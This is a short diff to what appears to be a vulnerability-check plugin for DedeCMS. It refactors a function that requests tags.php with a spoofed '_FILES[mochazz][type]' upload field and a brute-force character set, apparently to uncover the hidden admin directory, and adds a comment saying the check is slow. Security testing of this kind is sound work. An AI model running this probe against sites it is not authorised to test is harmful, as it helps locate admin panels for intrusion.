@@ -21,6 +21,9 @@ def get_script_info(data=None):
     return script_info
 
 def prove(data):
+    '''
+    比较耗时，建议单独跑脚本
+    '''
     data = init(data, 'web')
     if data['base_url']:
         characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
@@ -31,15 +34,14 @@ def prove(data):
             "_FILES[mochazz][type]": "image/gif"
         }
         for a in ['', 'dedecms/']:
-            myurl = data['base_url'] + a
+            url = data['base_url'] + a + 'tags.php'
             back_dir = ""
             flag = 0
             try:
-                res = requests.get(myurl, headers=data['headers'], timeout=data['timeout'])
+                res = requests.get(url, headers=data['headers'], timeout=data['timeout'])
             except Exception as e:
                 res = None
             if res!=None and res.status_code != 404:
-                url = myurl + 'tags.php'
                 for num in range(1, 7):
                     if flag:
                         break
